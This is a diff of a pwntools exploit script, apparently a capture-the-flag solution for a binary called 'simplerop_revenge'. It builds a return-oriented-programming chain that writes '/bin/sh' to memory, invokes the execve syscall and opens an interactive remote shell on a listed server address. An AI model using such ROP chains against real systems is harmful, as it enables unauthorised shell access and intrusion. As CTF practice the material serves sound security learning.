@@ -2,41 +2,33 @@
 # -*- coding: utf-8 -*-
 # vim:fenc=utf-8
 #
-# Copyright © 2018 howpwn <finn79426@gmail.com>
+# Copyright © 2018 vagrant <finn79426@gmail.com>
 #
 # Distributed under terms of the MIT license.
 
 from pwn import *
 
-p = remote("0.0.0.0", 9999)
+# p = process("./simplerop_revenge")
+p = remote("140.110.112.31", 2124)
 context.arch = "amd64"
+
 p.recvuntil("Your input :")
 
-# padding 40
-
 payload = "A"*40
+buf = 0x6cb500 # bss header
 
+# Gadget
+mov_prdi_rsi = 0x000000000047a502
+pop_rdx = 0x00000000004427e6
+pop_rsi = 0x0000000000401577
+pop_rax_rbx_rbx = 0x0000000000478516
+pop_rdi = 0x0000000000401456
+syscall = 0x00000000004671b5
 
-# gadget 
-pop_rax_rdx_rbx = 0x0000000000478636
-pop_rdi = 0x00000000004014c6
-buf = 0x6cbb60
-pop_rdx = 0x0000000000442896
-mov_prdi_rdx = 0x0000000000435453
-pop_rsi = 0x00000000004015e7
-systemcall = 0x0000000000467265
-# rdi = buffer address
-payload += flat([pop_rdi, buf])
-# rdx = "/bin/sh\x00"
-payload += flat([pop_rdx, "/bin/sh\x00"])
-# *rdi = "/bin/sh\x00"
-payload += flat([mov_prdi_rdx])
-# rsi = 0
-payload += flat([pop_rsi, 0])
-# rax = 0, rdx = 0
-payload += flat([pop_rax_rdx_rbx, 0x3b, 0, 0])
-# system call
-payload += flat([systemcall])
+rop = flat([pop_rsi, "/bin/sh\x00", pop_rdi, buf, mov_prdi_rsi])
+rop += flat([pop_rax_rbx_rbx, 0x3b, 0, 0])
+rop += flat([pop_rsi, 0])
+rop += flat([syscall])
 
+p.sendline(payload + rop)
 p.interactive()
-
